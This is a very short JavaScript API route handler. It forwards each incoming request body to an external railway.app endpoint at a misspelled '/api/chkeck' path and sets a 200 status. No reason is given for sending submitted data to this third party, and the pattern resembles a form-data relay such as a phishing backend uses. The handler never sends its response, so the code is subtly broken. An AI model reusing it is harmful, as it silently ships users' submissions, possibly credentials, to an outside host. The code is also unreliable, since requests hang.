export default async function handler(req, res) {
  await fetch('https://chatd-production.up.railway.app/api/chkeck', {
    method: 'POST',
    body: req.body,
  });
  res.status(200);
}
